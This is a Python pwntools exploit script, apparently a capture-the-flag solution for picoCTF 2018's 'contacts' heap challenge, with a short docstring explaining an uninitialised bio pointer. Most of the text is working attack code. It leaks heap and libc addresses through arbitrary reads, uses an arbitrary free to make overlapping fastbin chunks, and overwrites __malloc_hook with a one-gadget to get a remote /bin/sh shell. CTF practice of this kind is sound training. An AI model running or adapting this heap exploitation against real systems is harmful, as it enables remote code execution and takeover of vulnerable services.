'''
- the program allows you to make contacts which look like this:

struct contact {
    char *name;
    char *bio;
};

when creating a contact it allocates memory for the contact and the name on the heap and sets the name but it doesnt set the bio and it also doesnt set it to null.
we can create a different object in the place where the contact is put any data at the place where the bio would be. now when we free that object and create a contact the old bio address is still there so we can get an arbitrary read and free an arbitrary address.
we can use our arbitrary free to get 2 overlapping free fastbin chunks to setup a fastbin attack to overwrite __malloc_hook or file struct / jump table.
'''

from pwn import *

#r = process('./contacts')
r = remote('2018shell2.picoctf.com', 56667)

def display(name):
	r.sendafter('> ', 'display\n')
	r.recvuntil(name + ' - ')
	return r.recvuntil('\n').split('\n')[0]

def create(name):
	r.sendafter('> ', 'create ' + name + '\n')

def delete(name):
	r.sendafter('> ', 'delete ' + name + '\n')

def bio(name, length, bio):
	r.sendafter('> ', 'bio ' + name + '\n')
	r.sendafter('How long will the bio be?', str(length) + '\n')
	r.sendafter('Enter your new bio:', bio + '\n')

log.info('Leaking heap address.')

create('A'*8 + p64(0x6020c0))
delete('A'*8 + p64(0x6020c0))
create('A'*0x20)
create('heap_leak')

heap = u64(display('heap_leak')[:6].ljust(8, '\x00')) - 0x1020

log.success('Heap @ ' + hex(heap))

log.info('Leaking libc address.')

bio('A'*0x20, 0x10, p64(0x0) + p64(0x602020))
delete('A'*0x20)
create('A'*0x20)
create('libc_leak')

libc = u64(display('libc_leak')[:6].ljust(8, '\x00')) - 0x6f690

log.success('Libc @ ' + hex(libc))

log.info('Using arbitrary free to overlap a free fastbin chunk so that we can corrupt the chunks meta data.')

create('A'*8 + p64(0x51))
bio('A'*8 + p64(0x51), 0x60, p64(0x0)*7 + p64(0x21))

bio('A'*0x20, 0x10, p64(0x0) + p64(heap + 0x1120))
delete('A'*0x20)
create('A'*0x20)
create('overlap')

delete('A'*8 + p64(0x51))

delete('overlap')

log.info('Use fastbin corruption to overwrite __malloc_hook with a magic gadget to call /bin/sh.')

#create some chunks to fill some free fastbin chunks to prevent our new chunk from having a bio.

create('fill_0')
create('fill_1')

create('pwn')
bio('pwn', 0x40, p64(0x0) + p64(0x71) + p64(libc + 0x3c4b10 - 0x23))

create('A'*0x60) #create contact where the name chunk falls into the 0x70 fastbin so that now the next chunk we allocate that falls into the 0x70 fastbin will return &__malloc_hook-0x13
bio('A'*0x60, 0x60, '\x00'*0x13 + p64(libc + 0x4526a)) #now this bio will have the address of __malloc_hook - 0x13 where it will write the address of the magic gadget to.

log.info('Call malloc and get a shell.')

create('shell')

r.interactive()
